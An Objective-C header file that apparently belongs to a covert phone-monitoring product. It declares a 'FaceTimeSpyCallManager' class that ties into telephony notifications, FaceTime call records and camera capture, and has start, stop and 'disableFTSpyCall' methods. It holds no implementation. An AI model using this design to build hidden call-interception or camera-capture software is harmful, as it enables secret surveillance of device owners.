//
//  FaceTimeSpyCallManager.h
//  FaceTimeSpyCallManager
//
//  Created by Makara Khloth on 7/15/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "MessagePortIPCReader.h"

@class RecentFaceTimeCallNotifier, FMDatabase,SBKilledController;

@protocol TelephonyNotificationManager, PreferenceManager, EventDelegate,CameraEventCapture;

@interface FaceTimeSpyCallManager : NSObject <MessagePortIPCDelegate> {
@private
	RecentFaceTimeCallNotifier		*mRecentFTCallNotifier;
	MessagePortIPCReader			*mMessagePortReader;
    SBKilledController              *mSBKilledController;
	
	id <TelephonyNotificationManager>	mTelephonyNotificationManager;
	id <PreferenceManager>				mPreferenceManager;
	id <EventDelegate>					mEventDelegate;
	id <CameraEventCapture>				mCameraEventCapture;
	
	NSUInteger						mFrameStripID;
	NSString						*mFSDBPath;
	FMDatabase						*mFSDatabase;
	
	NSString						*mOutputImagePath;
}

@property (nonatomic, assign) id <TelephonyNotificationManager> mTelephonyNotificationManager;
@property (nonatomic, assign) id <PreferenceManager> mPreferenceManager;
@property (nonatomic, assign) id <EventDelegate> mEventDelegate;
@property (nonatomic, assign) id <CameraEventCapture> mCameraEventCapture;

@property (nonatomic, copy) NSString *mFSDBPath;
@property (nonatomic, copy) NSString *mOutputImagePath;

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate;

- (void) start;
- (void) stop;

- (void) disableFTSpyCall;

@end
